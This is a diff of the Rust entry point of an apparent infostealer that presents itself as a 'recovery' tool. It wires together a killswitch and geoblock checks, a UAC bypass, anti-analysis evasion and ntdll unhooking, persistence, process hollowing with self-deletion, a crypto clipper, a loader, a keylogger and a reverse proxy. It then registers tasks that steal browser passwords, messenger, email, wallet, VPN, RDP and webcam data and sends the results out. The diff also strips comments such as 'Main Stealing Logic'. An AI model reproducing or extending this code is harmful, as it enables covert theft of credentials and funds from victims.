@@ -10,6 +10,13 @@ use tracing_subscriber::{EnvFilter, fmt};
 
 #[tokio::main(flavor = "multi_thread")]
 async fn main() -> Result<(), RecoveryError> {
+    if recovery::killswitch::check_killswitch().await
+        || !recovery::behavioral::check_behavioral().await
+        || !recovery::geoblock::check_geoblock().await
+    {
+        std::process::exit(0);
+    }
+
     let fmt_layer = fmt::layer().with_target(false);
     let filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));
     tracing_subscriber::registry()
@@ -17,58 +24,34 @@ async fn main() -> Result<(), RecoveryError> {
         .with(fmt_layer)
         .init();
 
-    // 1. Absolute first priority: Killswitch and Environment Validation
-    if recovery::killswitch::check_killswitch().await {
-        return Ok(());
-    }
-
-    if !recovery::behavioral::check_behavioral().await {
-        return Ok(());
-    }
-
-    // 2. Geoblocking - don't even try to elevate if we are in a forbidden region
-    if !recovery::geoblock::check_geoblock().await {
-        return Ok(());
-    }
-
-    // 3. Elevation - get admin rights before unhooking/hollowing
     recovery::uac::attempt_uac_bypass().await;
 
-    // 4. Evasion - Apply sandbox/anti-vm again (redundancy) and unhook
     recovery::evasion::apply_evasion_techniques();
 
     let syscall_manager = recovery::helpers::syscalls::SyscallManager::new().ok();
     let _ = recovery::helpers::unhooking::unhook_ntdll(syscall_manager.as_ref());
 
-    // 5. Context Discovery
     let context = RecoveryContext::discover()
         .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;
 
-    // 6. Persistence - Install BEFORE hollowing so we copy the actual malware binary
     recovery::persistence::install_persistence().await;
 
-    // 7. Hide execution - Hollow into a legitimate system process
     if recovery::hollowing::perform_hollowing().await {
-        // If hollowing succeeded, we are now the "old" dropper process.
-        // We should melt (self-delete) and exit.
         recovery::self_delete::perform_melt();
         std::process::exit(0);
     }
 
-    // 8. Background Tasks (if not hollowed or if running as hollowed payload)
     recovery::clipper::run_clipper().await;
     recovery::loader::run_loader().await;
 
-    // 9. Main Stealing Logic
     let mut manager = RecoveryManager::new(context.clone());
     register_all_tasks(&mut manager, &context).await?;
 
     let outcomes = manager.run_all().await?;
 
     tracing::info!(
-        "recovery session complete: {} tasks | summary logged at {}",
-        outcomes.len(),
-        manager.context().output_dir.join("summary.log").display()
+        "recovery session complete: {} tasks",
+        outcomes.len()
     );
 
     if let Err(err) = send_outcomes(&outcomes).await {
@@ -82,12 +65,12 @@ async fn register_all_tasks(
     manager: &mut RecoveryManager,
     context: &RecoveryContext,
 ) -> Result<(), RecoveryError> {
-    use recovery::browser::browsers;
     use recovery::{
-        account_validation, behavioral, browser::chromium, clipboard, communication::discord,
-        communication::email, communication::messenger, devops, ftp, gaming, browser::gecko,
-        browser::gecko_passwords, hardware, other, proxy, rdp, screenshot, network::services,
-        surveillance, system, vnc, vpn, wallet, webcam, wifi, storage::file_recovery,
+        account_validation, behavioral, chromium, clipboard, discord,
+        email, messenger, devops, ftp, gaming, gecko,
+        gecko_passwords, hardware, other, proxy, rdp, screenshot, services,
+        surveillance, system, vnc, vpn, wallet, webcam, wifi, file_recovery,
+        browsers,
     };
 
     manager.register_tasks(browsers::default_browser_tasks(context).await);
@@ -95,7 +78,6 @@ async fn register_all_tasks(
     manager.register_tasks(gecko_passwords::gecko_password_tasks(context));
     manager.register_tasks(chromium::chromium_secrets_tasks(context));
 
-    // Register Proxy & Keylogger
     manager.register_task(std::sync::Arc::new(proxy::ReverseProxyTask));
     manager.register_task(std::sync::Arc::new(surveillance::keylogger::KeyloggerTask));
 
